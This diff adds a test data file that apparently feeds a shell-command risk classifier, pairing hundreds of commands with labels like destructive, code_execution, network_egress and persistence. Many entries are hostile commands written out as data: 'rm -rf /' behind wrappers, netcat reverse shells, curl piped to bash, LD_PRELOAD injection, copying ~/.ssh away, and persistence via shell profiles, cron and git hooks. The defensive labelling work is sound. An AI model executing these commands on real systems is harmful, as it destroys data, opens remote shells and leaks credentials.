@@ -1,0 +1,844 @@
+xargs -n 1 rm -rf	local_write
+xargs -n1 rm -rf	local_write
+xargs -0 -n 1 rm	local_write
+xargs -I {} rm {}	local_write
+xargs -I{} rm {}	local_write
+xargs --max-args 2 rm	local_write
+xargs --max-args=2 rm	local_write
+xargs --replace rm	local_write
+xargs --eof rm	local_write
+xargs -P 4 -n 1 rm	local_write
+xargs -0n1 rm	local_write
+xargs -- rm	local_write
+xargs -L 1 -d , rm	local_write
+parallel -j 4 rm {}	local_write
+parallel -j4 rm {}	local_write
+parallel --jobs 4 rm {}	local_write
+parallel --jobs=4 rm {}	local_write
+timeout 5 rm -rf /	destructive,system_write,local_write
+timeout -s KILL 5 rm -rf /	destructive,system_write,local_write
+timeout -sKILL 5 rm -rf /	destructive,system_write,local_write
+timeout --signal KILL 5 rm -rf /	destructive,system_write,local_write
+timeout --signal=KILL 5 rm -rf /	destructive,system_write,local_write
+timeout --kill-after 3 5 rm -rf /	destructive,system_write,local_write
+timeout --kill=3 5 rm -rf /	destructive,system_write,local_write
+timeout --foreground 5 ls	safe
+nice -n 5 rm -rf /	destructive,system_write,local_write
+nice -n5 rm -rf /	destructive,system_write,local_write
+nice --adjustment 5 rm -rf /	destructive,system_write,local_write
+nice --adjustment=5 rm -rf /	destructive,system_write,local_write
+nice --adj 5 rm -rf /	destructive,system_write,local_write
+ionice -c 2 -n 7 rm -rf /	destructive,system_write,local_write
+ionice -c2 -n7 ls	safe
+stdbuf -oL ls	safe
+stdbuf -o L rm -rf /	destructive,system_write,local_write
+stdbuf --output=L rm -rf /	destructive,system_write,local_write
+chrt -f 10 rm -rf /	destructive,system_write,local_write
+taskset 0x1 rm -rf /	destructive,system_write,local_write
+taskset -c 0 ls	safe
+flock /tmp/l rm -rf /	destructive,system_write,local_write
+flock -w 5 /tmp/l rm -rf /	destructive,system_write,local_write
+flock -w5 /tmp/l rm -rf /	destructive,system_write,local_write
+flock /tmp/l -c 'rm -rf /'	destructive,system_write,code_execution,local_write
+flock -n /tmp/l ls	safe
+sudo -u root rm -rf /	destructive,system_write,local_write
+sudo -uroot ls	system_write
+sudo --user=root ls	system_write
+sudo --user root rm -rf /	destructive,system_write,local_write
+sudo -E ls	system_write
+sudo -- rm -rf /	destructive,system_write,local_write
+sudo -i	system_write
+sudo -g wheel ls	system_write
+doas -u root ls	system_write
+env -i rm -rf /	destructive,system_write,local_write
+env -u FOO ls	safe
+env -uFOO rm -rf /	destructive,system_write,local_write
+env FOO=1 ls	safe
+env -C /tmp ls	safe
+env -S 'rm -rf /' 	destructive
+env -S'rm -rf /'	destructive
+watch -n 5 ls	safe
+watch -n5 'rm -rf /'	destructive,system_write,code_execution,local_write
+watch -x ls	safe
+watch --interval 5 ls	safe
+strace -o /tmp/t ls	safe
+strace -e trace=open -p 1	safe
+script -q /dev/null	code_execution
+script -c ls /dev/null	code_execution,safe
+git -C /tmp status	code_execution
+git -c user.name=x status	safe
+git --git-dir=/tmp/.git status	system_write,code_execution
+git --git-dir /tmp/.git status	system_write,code_execution
+git --work-tree /tmp status	system_write
+git --namespace n status	safe
+git -c core.pager=x log	code_execution
+git -c core.pager='sh -c id' log	code_execution
+git --no-pager log	safe
+git -p log	code_execution
+git -C /tmp -c a=b commit -m x	code_execution
+git --exec-path=/tmp status	code_execution
+git --config-env=a=B status	safe
+git push origin main	network_egress
+git push --force origin main	system_write,network_egress
+git archive -o /tmp/a.tar HEAD	local_write,safe
+git archive -o/tmp/a.tar HEAD	local_write,safe
+git archive --output=/tmp/a.tar HEAD	local_write,safe
+git archive --output /tmp/a.tar HEAD	local_write,safe
+git archive --out=/tmp/a.tar HEAD	local_write,safe
+git log --output=/tmp/a	local_write,safe
+git log --out /tmp/a	safe
+git diff --output=/tmp/x	local_write,safe
+git format-patch --output=/tmp/p HEAD~1	local_write,safe
+git maintenance start	persistence
+git -C /x maintenance register	persistence
+hugo	local_write
+hugo server	code_execution
+hugo -s /tmp server	code_execution
+hugo --source /tmp new site x	local_write
+hugo -d /tmp/out	local_write
+hugo --destination=/tmp/o	local_write
+hugo version	safe
+hugo mod get	safe
+hugo -b http://x server	code_execution
+hugo -D server	local_write
+kubectl get pods	network_egress
+kubectl -n kube-system get pods	network_egress
+kubectl --namespace kube-system delete pod x	system_write
+kubectl --namespace=kube-system delete pod x	system_write
+kubectl -nkube-system delete pod x	system_write
+kubectl --context c apply -f x.yaml	system_write
+kubectl exec -it pod -- sh	code_execution
+kubectl -v 5 get pods	network_egress
+kubectl -v5 delete pod x	system_write
+kubectl --kubeconfig /tmp/k get pods	network_egress
+helm install x y	system_write
+helm -n ns install x y	system_write
+helm --kube-context c upgrade x y	system_write
+helm --post-renderer ./p install x y	code_execution
+helm --post-renderer=./p template x y	code_execution
+helm list	network_egress
+docker ps	safe
+docker -H tcp://h ps	safe
+docker -H tcp://h run x	code_execution
+docker --host tcp://h run x	code_execution
+docker --host=tcp://h run x	code_execution
+docker -c ctx run x	code_execution
+docker --context ctx run x	code_execution
+docker -l debug ps	safe
+docker --log-level debug run x	code_execution
+docker --config /tmp/c run x	code_execution
+docker run --rm x	code_execution
+docker rm x	local_write
+docker stop x	local_write
+docker compose up	code_execution
+docker compose -f x.yml up	code_execution
+docker compose -p proj up -d	code_execution
+docker compose --file x.yml down	local_write
+docker compose --project-name x ps	safe
+docker compose --ansi never up	code_execution
+docker compose ps	safe
+docker image ls	safe
+docker image rm x	system_write,local_write
+docker image prune	system_write
+docker system prune -af	system_write
+docker volume rm x	system_write,local_write
+docker volume ls	safe
+docker network ls	safe
+docker context ls	safe
+docker container ls	safe
+docker container rm x	local_write
+docker buildx build .	code_execution
+docker-compose up	code_execution
+docker-compose -f x.yml up	code_execution
+docker-compose -f x.yml ps	safe
+docker-compose --file x.yml down	local_write
+docker-compose -p x logs	safe
+podman -r run x	code_execution
+nerdctl --namespace x ps	unknown
+tar xf a.tar	local_write
+tar -xf a.tar	local_write
+tar xvf a.tar	local_write
+tar tf a.tar	local_write
+tar -tf a.tar	safe
+tar -tvf a.tar	safe
+tar -t -f a.tar	safe
+tar --list -f a.tar	safe
+tar --list --file a.tar	safe
+tar -xIf prog a.tar	code_execution,local_write
+tar xIf prog a.tar	code_execution,local_write
+tar -I prog -xf a.tar	code_execution,local_write
+tar -Iprog -xf a.tar	code_execution,local_write
+tar --use-compress-program=prog -xf a.tar	code_execution,local_write
+tar --use-compress-program prog -xf a.tar	code_execution,local_write
+tar --use-compress=prog -xf a.tar	code_execution,local_write
+tar --use=prog -xf a.tar	code_execution,local_write
+tar --to-command=prog -xf a.tar	code_execution,local_write
+tar --to-command prog -xf a.tar	code_execution,local_write
+tar --checkpoint=1 --checkpoint-action=exec=prog -cf a.tar x	code_execution,local_write
+tar --checkpoint-action=echo=x -cf a.tar x	local_write
+tar --checkpoint-action exec=prog -cf a.tar x	code_execution,local_write
+tar --checkpoint -cf a.tar x	local_write
+tar -cvf a.tar x	local_write
+tar -czf a.tar.gz x	local_write
+tar -C /etc -xf a.tar	system_write,local_write
+tar -C/etc -xf a.tar	system_write,local_write
+tar --directory /etc -xf a.tar	system_write,local_write
+tar --directory=/etc -xf a.tar	system_write,local_write
+tar -xf a.tar -C /home/user/.ssh	system_write,local_write
+tar -xf a.tar -C/home/user/.ssh	system_write,local_write
+tar -xvf a.tar -C /etc	system_write,local_write
+tar -xvC /etc -f a.tar	system_write,local_write
+tar -tC /etc -f a.tar	system_write,safe
+tar -tfC a.tar	safe
+tar -cf a.tar --rsh-command=prog x	code_execution,local_write
+tar -cF prog -f a.tar x	code_execution,local_write
+tar -tvf a.tar --use-compress-program=sh	code_execution,local_write
+tar --list --use-compress-program=sh -f a.tar	code_execution,local_write
+chmod u+s f	system_write,local_write
+chmod +s f	system_write,local_write
+chmod g+s f	system_write,local_write
+chmod 4755 f	system_write,local_write
+chmod 04755 f	system_write,local_write
+chmod 2755 f	system_write,local_write
+chmod 0755 f	local_write
+chmod 755 f	local_write
+chmod 1777 f	local_write
+chmod -R 4755 d	system_write,local_write
+chmod -R u+s d	system_write,local_write
+chmod -- 4755 f	system_write,local_write
+chmod -x,u+s f	system_write,local_write
+chmod -w,g+s f	system_write,local_write
+chmod --reference=r f	system_write,local_write
+chmod --reference r f	system_write,local_write
+chmod --ref=r f	local_write
+chmod -R 755 f	local_write
+chmod --recursive u+s d	system_write,local_write
+chmod -v u=rws f	system_write,local_write
+chmod a=rwxs f	system_write,local_write
+chmod ug+rs f	system_write,local_write
+chmod u+x f	local_write
+chmod go-w f	local_write
+chmod -c -R 755 d	local_write
+chmod 6755 f	system_write,local_write
+chmod 0644 build+gen.s	local_write
+chmod 644 f 4755	local_write
+install -m 4755 a b	system_write,local_write
+install -m4755 a b	system_write,local_write
+install -Dm4755 a b	system_write,local_write
+install -Dm 4755 a b	system_write,local_write
+install --mode=u+s a b	system_write,local_write
+install --mode u+s a b	system_write,local_write
+install --mod=4755 a b	system_write,local_write
+install -m 755 a b	local_write
+install -m0755 a b	local_write
+install -o root a b	local_write
+install -oroot -m4755 a b	system_write,local_write
+install -t /tmp a b	local_write
+install -t/tmp a b	local_write
+install --target-directory=/tmp a b	local_write
+install --target /tmp a b	local_write
+install -D a /usr/local/bin/b	system_write,local_write
+mkdir -m 4755 d	system_write,local_write
+mkdir -m4755 d	system_write,local_write
+mkdir --mode=u+s d	system_write,local_write
+mkdir --mode u+s d	system_write,local_write
+mkdir -pm4755 d	system_write,local_write
+mkdir -p d	local_write
+mknod -m 4755 d p	unknown,system_write
+mknod --mode=2755 d p	unknown,system_write
+sed -i s/a/b/ f	local_write
+sed -i.bak s/a/b/ f	local_write
+sed --in-place s/a/b/ f	local_write
+sed --in-place=.bak s/a/b/ f	local_write
+sed --in s/a/b/ f	safe
+sed -ni p f	local_write
+sed -n p f	safe
+sed -e p f	safe
+sed -ne p f	safe
+sed -nie p f	local_write
+sed -f x.sed f	code_execution,local_write
+sed -nf x.sed f	code_execution,local_write
+sed --file=x.sed f	code_execution,local_write
+sed --file x.sed f	code_execution,local_write
+sed --expression=w/tmp/x f	safe
+sed -e w/tmp/x f	safe
+sed -ew/tmp/x f	safe
+sed -n w/tmp/x f	safe
+sed 's/a/b/w /tmp/x' f	local_write
+sed -s p f	safe
+sed -E s/a/b/ f	safe
+sed -z p f	safe
+sed -e 'e id' f	code_execution,local_write
+sed --sandbox p f	safe
+curl -o /tmp/x http://h	network_egress,local_write
+curl -o/tmp/x http://h	network_egress,local_write
+curl --output /tmp/x http://h	network_egress,local_write
+curl --output=/tmp/x http://h	network_egress,local_write
+curl --out /tmp/x http://h	network_egress,local_write
+curl -sSLo /tmp/x http://h	network_egress,local_write
+curl -sSLO http://h/x	network_egress,local_write
+curl -O http://h/x	network_egress,local_write
+curl --remote-name http://h/x	network_egress,local_write
+curl --remote-n http://h/x	network_egress,local_write
+curl --output-dir /tmp -O http://h/x	network_egress,local_write
+curl --output-dir=/tmp -O http://h/x	network_egress,local_write
+curl --output-d /tmp -O http://h/x	network_egress,local_write
+curl -d @f http://h	network_upload,network_egress
+curl -d@f http://h	network_upload,network_egress
+curl --data @f http://h	network_upload,network_egress
+curl --data=@f http://h	network_upload,network_egress
+curl -T f http://h	network_upload,network_egress
+curl -Tf http://h	network_upload,network_egress
+curl --upload-file f http://h	network_upload,network_egress
+curl --upload f http://h	network_upload,network_egress
+curl -F a=@f http://h	network_upload,network_egress
+curl -Fa=@f http://h	network_upload,network_egress
+curl -X POST http://h	network_upload,network_egress
+curl -XPOST http://h	network_upload,network_egress
+curl --request POST http://h	network_upload,network_egress
+curl -K cfg http://h	code_execution,network_egress
+curl -Kcfg http://h	code_execution,network_egress
+curl --config cfg http://h	code_execution,network_egress
+curl -c /tmp/j http://h	network_egress,local_write
+curl -D /tmp/h http://h	network_egress,local_write
+curl --dump-header /tmp/h http://h	network_egress,local_write
+curl --trace /tmp/t http://h	network_egress,local_write
+curl -sS http://h	network_egress
+curl -s -- http://h	network_egress
+curl -H 'a: b' http://h	network_egress
+curl -Ha:b http://h	network_egress
+curl --header 'a: b' http://h	network_egress
+wget -O /tmp/x http://h	network_egress,local_write
+wget -O/tmp/x http://h	network_egress,local_write
+wget --output-document /tmp/x http://h	network_egress,local_write
+wget --output-document=/tmp/x http://h	network_egress,local_write
+wget --output-doc=/tmp/x http://h	network_egress,local_write
+wget -P /tmp http://h/x	network_egress,local_write
+wget -P/tmp http://h/x	network_egress,local_write
+wget -qP /tmp http://h/x	network_egress,local_write
+wget -qP/tmp http://h/x	network_egress,local_write
+wget --directory-prefix=/tmp http://h/x	network_egress,local_write
+wget --directory-prefix /tmp http://h/x	network_egress,local_write
+wget --directory-pre /tmp http://h/x	network_egress,local_write
+wget -o /tmp/log http://h/x	network_egress,local_write
+wget -a /tmp/log http://h/x	network_egress,local_write
+wget --post-file f http://h	network_upload,network_egress,local_write
+wget --post-data x http://h	network_egress,local_write
+wget -i urls http://h	code_execution,network_egress,local_write
+wget -q http://h/x	network_egress,local_write
+wget -qO- http://h/x	network_egress,local_write
+wget -qO /tmp/x http://h/x	network_egress,local_write
+ssh host	network_egress
+ssh -p 22 host	network_egress
+ssh -p22 host	network_egress
+ssh -o ProxyCommand=x host	code_execution,network_egress
+ssh -oProxyCommand=x host	code_execution,network_egress
+ssh -o 'ProxyCommand x' host	code_execution,network_egress
+ssh -F cfg host	code_execution,network_egress
+ssh -Fcfg host	code_execution,network_egress
+ssh -L 80:x:80 host	network_upload,network_egress
+ssh -L80:x:80 host	network_upload,network_egress
+ssh -R 80:x:80 host	network_upload,network_egress
+ssh -D 1080 host	network_upload,network_egress
+ssh -W h:p host	network_upload,network_egress
+ssh -vvv host	network_egress
+ssh -vo ProxyCommand=x host	code_execution,network_egress
+ssh -vFcfg host	code_execution,network_egress
+ssh -i key host ls	network_egress
+ssh host -p 22	network_egress
+ssh host ls -l	network_egress
+ssh -- host ls	network_egress
+ssh -oLocalCommand=x host	code_execution,network_egress
+ssh -o StrictHostKeyChecking=no host	network_egress
+scp -S prog a h:b	code_execution,network_upload,network_egress
+scp -Sprog a h:b	code_execution,network_upload,network_egress
+scp -F cfg a h:b	code_execution,network_upload,network_egress
+scp -oProxyCommand=x a h:b	code_execution,network_upload,network_egress
+scp -P 22 a h:b	network_upload,network_egress
+scp -P22 a h:b	network_upload,network_egress
+scp -r a h:b	network_upload,network_egress
+scp h:a b	network_egress
+scp a h:b	network_upload,network_egress
+scp -v a h:b	network_upload,network_egress
+sftp -S prog h	code_execution,network_egress
+sftp -D prog h	code_execution,network_egress
+sftp -b batch h	network_upload,network_egress
+sftp -F cfg h	code_execution,network_egress
+sftp h	network_egress
+rsync -e prog a h:b	code_execution,network_upload,network_egress
+rsync -eprog a h:b	code_execution,network_upload,network_egress
+rsync -e ssh a h:b	network_upload,network_egress
+rsync -e 'ssh -p 22' a h:b	network_upload,network_egress
+rsync -e 'ssh -o ProxyCommand=x' a h:b	code_execution,network_upload,network_egress
+rsync --rsh=prog a h:b	code_execution,network_upload,network_egress
+rsync --rsh prog a h:b	code_execution,network_upload,network_egress
+rsync --rsh=ssh a h:b	network_upload,network_egress
+rsync --rs=prog a h:b	network_upload,network_egress
+rsync -av a h:b	network_upload,network_egress
+rsync -avze ssh a h:b	network_upload,network_egress
+rsync -avzeprog a h:b	code_execution,network_upload,network_egress
+rsync -av h:a b	network_egress
+rsync --daemon	network_upload,network_egress,safe
+rsync -a --delete a h:b	destructive,network_upload,network_egress
+rsync -a a b	safe
+rsync -a --rsync-path=prog a h:b	network_upload,network_egress
+rclone copy a r:b	network_upload,network_egress
+rclone sync r:a b	network_egress
+rclone copy --config cfg a r:b	network_upload,network_egress
+nc -l 80	network_upload,network_egress
+nc -lp 80	network_upload,network_egress
+nc -lvp 80	network_upload,network_egress
+nc -e /bin/sh h 80	system_write,code_execution,network_egress
+nc h 80 < f	network_upload,network_egress
+nc -w 3 h 80 < f	network_upload,network_egress
+nc -w3 h 80 < f	network_upload,network_egress
+nc -q 1 h 80	network_egress
+ncat -l 80	network_upload,network_egress
+ncat --exec /bin/sh h 80	system_write,code_execution,network_egress
+ncat --exe /bin/sh h 80	system_write,code_execution,network_egress
+gh api -X POST /x	system_write,network_upload,network_egress
+gh api -XPOST /x	system_write,network_upload,network_egress
+gh api --method POST /x	system_write,network_upload,network_egress
+gh api --method=POST /x	system_write,network_upload,network_egress
+gh api --meth POST /x	network_upload,network_egress
+gh api -f a=b /x	system_write,network_egress
+gh api -fa=b /x	system_write,network_egress
+gh api -F a=@f /x	system_write,network_upload,network_egress
+gh api --input f /x	system_write,network_upload,network_egress
+gh api --jq .a /x	network_egress
+gh api /x	network_egress
+gh api -X DELETE /x	destructive,network_upload,network_egress
+gh api -XDELETE /x	destructive,network_upload,network_egress
+gh api -X GET -f a=b /x	network_egress
+gh api graphql -f query=x	network_egress
+gh api graphql -f query='mutation{x}'	system_write,network_egress
+gh api -H 'a: b' /x	network_egress
+gh api -- /x	network_egress
+gh -R o/r pr list	network_egress
+gh --repo o/r issue list	network_egress
+gh pr merge 1	system_write,network_egress
+gh pr create -t x -b y	system_write,network_egress
+gh repo clone o/r	network_egress,local_write
+gh repo clone o/r d	network_egress,local_write
+gh repo clone o/r d -- --upload-pack=x	code_execution,network_egress,local_write
+gh repo clone o/r -- -c core.sshCommand=x	code_execution,network_egress,local_write
+gh run download 1	network_egress,local_write
+gh run download 1 -D /tmp	network_egress,local_write
+gh run download 1 -D/tmp	network_egress,local_write
+gh run download 1 --dir /tmp	network_egress,local_write
+gh run download 1 --dir=/tmp	network_egress,local_write
+gh run download 1 -D=/tmp	network_egress,local_write
+gh release download v1 -O /tmp/x	network_egress,local_write
+gh release download v1 -O- 	network_egress,local_write
+gh release download v1 --output /tmp/x	network_egress,local_write
+gh release download v1 -D /etc	system_write,network_egress,local_write
+gh alias set x '!rm -rf /'	code_execution,network_egress
+gh alias set -s x 'ls'	code_execution,network_egress
+gh alias set x ls	system_write,network_egress
+gh auth status	network_egress
+gh auth status -t	system_write,network_egress
+gh auth status --show-token	system_write,network_egress
+gh auth token	system_write,network_egress
+gh config get x	network_egress
+gh config get -h h x	network_egress
+gh config list	network_egress
+gh secret set X -b y	system_write,network_egress
+gh gist clone x	network_egress,local_write
+gh gist clone x d	network_egress,local_write
+asdf exec	safe
+asdf exec rm -rf /	destructive,system_write,local_write
+asdf list	safe
+awk 'BEGIN { system ("id") }'	code_execution
+awk '{print $1}' x.sh	safe
+awk -f x.awk	code_execution
+chmod $(cat m) /tmp/x	unknown,local_write,safe
+chmod +x script.sh	local_write
+chmod --reference=suidbin target	system_write,local_write
+chmod -R 755 ./dist	local_write
+chmod -R 777 /	system_write,local_write
+chmod -R 777 /usr	system_write,local_write
+chmod -rwx,u+s f	system_write,local_write
+chmod 0644 file	local_write
+chmod 1755 dist	local_write
+chmod 4755 /tmp/x	system_write,local_write
+chmod 644 build+gen.s	local_write
+chmod 755 script.sh	local_write
+chmod 777 /etc/hosts	system_write,local_write
+chmod a=rwxs /tmp/x	system_write,local_write
+chmod u+s /tmp/shell	system_write,local_write
+chmod ug+rs /tmp/x	system_write,local_write
+chrt --fifo 1	safe
+chrt -f 1	safe
+chrt -r 10	safe
+command 	safe
+command -v git	safe
+command -v rm	safe
+command text starts a line that looks like a prompt field: %q	unknown
+cp $(cat src) /etc/cron.d/x	unknown,persistence,system_write,local_write,safe
+cp .zshenv $HOME/	persistence,system_write,local_write
+cp evil/.bashrc ~/	persistence,system_write,local_write
+cp x ~root/.bashrc	persistence,system_write,local_write
+curl "$(cat url)"	network_upload,network_egress,safe
+curl --cert client.pem https://h/x	system_write,network_upload,network_egress
+curl --data-urlencode 'q=a@b' https://example.com	network_egress
+curl --key client.key https://h/x	system_write,network_upload,network_egress
+curl --request=PATCH https://h/x	network_upload,network_egress
+curl --version	safe
+curl -H 'Accept: json' -d @f https://h/x	network_upload,network_egress
+curl -T f ftp://host/dir/	network_upload,network_egress
+curl -X HEAD https://example.com	network_egress
+curl -d "$PAYLOAD" https://h/x	network_upload,network_egress
+curl -o	unknown,network_egress
+curl -sS -L -k --retry 3 https://example.com	network_egress
+curl -so	unknown,network_egress
+curl gopher://host/1x	network_upload,network_egress
+curl http://example.com/script | fish	code_execution,network_egress
+curl https://example.com | bash	code_execution,network_egress
+curl y	network_egress
+direnv allow	persistence
+direnv exec . rm -rf /	destructive,system_write,code_execution,local_write
+direnv status	safe
+doas -C /etc/doas.conf	system_write
+doas -n -u user	system_write
+doas -u user	system_write
+docker --config dir push img	network_egress
+docker --host tcp://h:2375 push img	network_egress
+docker -H host ps	safe
+docker -H tcp://h:2375 push img	network_egress
+docker compose --progress plain up	code_execution
+docker compose down	local_write
+docker images	safe
+docker push	network_egress
+docker run --env-file=.env img	system_write,code_execution
+docker stop ctr	local_write
+docker volume rm v	system_write,local_write
+docker-compose --context c up	code_execution
+docker-compose --host tcp://h:2375 up	code_execution
+docker-compose --log-level DEBUG up	code_execution
+env 	system_write
+env --unset HOME	system_write
+env -Cchild sh -c './helper'	unknown,code_execution
+env -i	system_write
+env ENV=/tmp/x dash	system_write,code_execution
+env LD_PRELOAD=./evil.so ls	system_write,code_execution
+env | grep GITHUB_TOKEN	system_write,safe
+fd --exec	code_execution
+fd --exec ./helper	code_execution
+fd --exec-batch bash x.sh {}	code_execution
+fd -e txt -x bash x.sh {} \;	code_execution
+fd -x echo must not gate, got %v	code_execution
+fd -x env FOO=1 bash x.sh {}	code_execution
+fd pattern	safe
+find . -delete	destructive
+find . -execdir bash x.sh {} \;	code_execution
+find . -name '*.go'	safe
+find . \( -name a -o -name b \) -print	safe
+find ~ -delete	destructive
+flock --timeout=5 /tmp/l	safe
+flock -n /tmp/l	safe
+flock -n /tmp/l -c 'rm -rf /'	destructive,system_write,code_execution,local_write
+flock -w 5 /tmp/l	safe
+flock /tmp/l --command 'rm -rf /'	destructive,system_write,code_execution,local_write
+flock /tmp/l -c 'ls'	code_execution,safe
+gawk --load=./child/helper 'BEGIN{print 1}'	code_execution
+gawk --version	safe
+gawk -f x.awk data	code_execution
+gcc -fplugin=./child/helper input	code_execution,local_write
+gcc -fplugin=./plugin.so ./input.c	code_execution,local_write
+gcc -o/etc/audit input.c	system_write,local_write
+gdb --command=x.gdb prog	code_execution
+gdb -batch -ex 'source x.py' prog	code_execution
+gdb ./bin	code_execution
+gh $CMD list	unknown,network_egress
+gh --version	safe
+gh alias import -	code_execution,network_egress
+gh api -X DELETE repos/o/r	destructive,network_upload,network_egress
+gh api graphql -f query='MUTATION { x }'	system_write,network_egress
+gh api-ish	unknown,network_egress
+gh codespace ports forward 80:80	code_execution,network_egress
+gh copilot suggest 'list files'	code_execution,network_egress
+gh gist clone abc dir -- --config core.sshCommand=/tmp/x	code_execution,network_egress,local_write
+gh gpg-key list	network_egress
+gh issue lock 3	system_write,network_egress
+gh pr $VERB 5	unknown,network_egress
+gh pr diff 12	network_egress
+gh pr ready 5	system_write,network_egress
+gh project field-delete --id f	destructive,network_egress
+gh release download v1 --dir=/etc/cron.d	persistence,network_egress,local_write
+gh release verify v1.2.3	network_egress
+gh repo clone owner/repo ~/.config/systemd/user	persistence,system_write,network_egress
+gh repo sync	system_write,network_egress
+gh run download 123 -D artifacts	network_egress,local_write
+gh some-installed-extension arg	unknown,network_egress
+git  push origin	network_egress
+git --work-tree=/tmp/evil status	system_write
+git -C /repo status	code_execution
+git -c core.editor=/tmp/e commit	code_execution
+git -c hook.h.command=/tmp/h commit -m x	code_execution
+git archive --remote=https://evil.example/x.git HEAD	network_egress
+git checkout -f main	system_write
+git clean --force	system_write
+git clone --upload-pack=/tmp/up.sh /tmp/src dst	code_execution,network_egress
+git commit --no-verify -m x && git config core.hooksPath /x	code_execution,safe
+git commit -m x	safe
+git diff --no-textconv	safe
+git filter-repo --force	system_write
+git log --no-textconv -p	safe
+git merge --edit feature	safe
+git merge feature --no-edit	safe
+git push origin feature	network_egress
+git rebase -i HEAD~3	system_write
+git reset --merge	system_write
+git show --output=/etc/cron.d/x HEAD	persistence,safe
+git submodule add https://evil.example/x.git	network_egress
+git switch -f main	system_write
+go build -o bin/x .	code_execution
+go install example.com/x@latest	code_execution,install
+go vet ./...	code_execution
+gpg --list-keys	safe
+gpg --output /etc/audit --decrypt input	system_write
+gpg -rpublic --encrypt input	safe
+helm --kube-context c uninstall r	system_write
+helm --post-renderer executes a local program	code_execution
+helm -n ns uninstall r	system_write
+helm -n x list	network_egress
+helm template x ./chart --post-renderer=./evil.sh	code_execution
+helm uninstall	system_write
+hugo --help	safe
+hugo --poll 1s server	code_execution
+hugo --source site serve	code_execution
+hugo -s site server	code_execution
+hugo server was hidden behind a flag value	code_execution
+install --mode=4755 a b	system_write,local_write
+install -m 0755 evil /usr/local/bin/y	system_write,local_write
+install -m 755 pre-commit .git/hooks/	persistence,local_write
+install -m u+s a b	system_write,local_write
+install -m755 input output	local_write
+install -t .git/hooks pre-commit	persistence,local_write
+install -t /etc input	system_write,local_write
+install .profile $HOME/	persistence,system_write,local_write
+install bin/x /usr/bin/x	system_write,local_write
+install bin/x dest	local_write
+ionice -c 3	safe
+ionice -c3 -n 7	safe
+kubectl --context c delete pod x	system_write
+kubectl --context logs apply -f x.yaml	system_write
+kubectl --kubeconfig /tmp/k delete pod x	system_write
+kubectl --namespace ns delete pod x	system_write
+kubectl -n get delete pods --all	system_write
+kubectl apply -f x.yaml	system_write
+kubectl auth reconcile -f rbac.yaml	system_write
+kubectl delete pod x	system_write
+kubectl version --client	network_egress
+make --file=x.mk all	code_execution
+make --version	safe
+make test	code_execution
+mise exec -- ls	code_execution
+mise exec -- rm -rf /	destructive,system_write,code_execution,local_write
+mise x -- rm -rf /	destructive,system_write,code_execution,local_write
+mise x node@20 -- ls	code_execution
+mkdir -m u+s d	system_write,local_write
+mkdir -p ~/proj/src	local_write
+mkdir /etc/evil.d	system_write,local_write
+mkdir dist	local_write
+mv --target-directory=/etc input	system_write,local_write
+mv /tmp/evil.sh x.sh && bash x.sh	code_execution,local_write
+mv ~/.ssh /tmp/stolen	system_write,local_write
+nc -c 'sh -i' host 4444	code_execution,network_egress
+nc -e/bin/sh host 4444	code_execution,network_egress
+nc -lk 9000	network_upload,network_egress
+nc -lvp 4444	network_upload,network_egress
+nc -zv host 1-100	network_egress
+nc host 80 < /dev/null	network_egress
+nc host 80 <<< hi	network_upload,network_egress
+ncat --exec /bin/sh -l 4444	system_write,code_execution,network_upload,network_egress
+ncat --listen 4444	network_upload,network_egress
+ncat -e /bin/sh host 4444	system_write,code_execution,network_egress
+ncat -v example.com 443	network_egress
+nerdctl ps	safe
+nerdctl run alpine	code_execution
+nice 	safe
+nice --adjustment=10	safe
+nice -n 10	safe
+nice -n 10 rm -rf /var	destructive,system_write,local_write
+nice -n 5 env -C /etc touch passwd	system_write,local_write,safe
+nice -n10	safe
+nice env	system_write
+nix develop --command rm -rf /	destructive,system_write,code_execution,local_write
+nix develop -c ls	code_execution
+nix run nixpkgs#hello	code_execution
+nix shell nixpkgs#hello --command rm -rf /	destructive,system_write,code_execution,local_write
+nix shell nixpkgs#hello -c rm -rf /	destructive,system_write,code_execution,local_write
+nvim --headless -S x.vim	code_execution
+nvim -l x.lua	code_execution
+nvim file.txt	code_execution
+parallel bash x.sh ::: a	code_execution
+parallel rm -rf /	destructive,system_write,local_write
+parallel rm -rf :::: /tmp/paths	unknown,local_write
+parallel rm -rf ::::paths	unknown,local_write
+podman ps	safe
+podman run alpine	code_execution
+protoc --plugin=./child/helper input	code_execution
+protoc --plugin=protoc-gen-audit=./child/helper input	code_execution
+protoc --version	safe
+rclone copy ./dir :s3:bucket/path	network_upload,network_egress
+rclone copy f remote:path	network_upload,network_egress
+rclone copyto f remote:x	network_upload,network_egress
+rclone move dir remote:bucket	network_upload,network_egress
+rclone serve http .	network_upload,network_egress
+rclone sync remote:a remote:b	network_egress
+rg --hostname-bin /tmp/h.sh foo	code_execution
+rg --pre ./helper pattern ./input	code_execution
+rg pattern	safe
+rsync --exclude '*.log' -a src/ host:dst	network_upload,network_egress
+rsync --rsh='ssh -F /tmp/cfg' a host:b	code_execution,network_upload,network_egress
+rsync -a -- host:src dst	network_egress
+rsync -a . rsync://evil.example.com/mod	network_upload,network_egress
+rsync -a a .github/workflows/ci.yml	persistence
+rsync -a a /srv/x	system_write
+rsync -a src rsync://host/mod	network_upload,network_egress
+rsync -av -e 'ssh -p 2222' src/ host:dst/	network_upload,network_egress
+rsync -av user@host:/src/ /dst/	network_egress
+rsync -e /tmp/p.sh a host:b	code_execution,network_upload,network_egress
+scp -- f host:p	network_upload,network_egress
+scp -P 22 h:f .	network_egress
+scp -o StrictHostKeyChecking=no f h:p	network_upload,network_egress
+scp ./a:b host:x	network_upload,network_egress
+scp f user@host:/p	network_upload,network_egress
+scp h:a h:b	network_egress
+scp user@host:/path file	network_egress
+script --command 'rm -rf /' /dev/null	destructive,system_write,code_execution,local_write
+script --command='rm -rf /' /dev/null	destructive,system_write,code_execution,local_write
+script -q -c 'rm -rf /' /dev/null	destructive,system_write,code_execution,local_write
+script -qc 'ls' /dev/null	code_execution,safe
+script -qc 'rm -rf /' /dev/null	destructive,system_write,code_execution,local_write
+script must not count as read	unknown,code_execution
+sed "s#foo#bar#e" input.txt	code_execution,local_write
+sed '/a/I e echo PWN' f	code_execution,local_write
+sed '1,/b/e echo PWN' f	code_execution,local_write
+sed '1{s#x#y#w /etc/audit;}' input	system_write,local_write
+sed '2,~4e echo PWN' f	code_execution,local_write
+sed 's/a\/b/c\/d/' file	safe
+sed 's/foo/bar/e' input.txt	code_execution,local_write
+sed --expression 'e whoami' input.txt	code_execution,local_write
+sed --file=script.sed README.md	code_execution,local_write
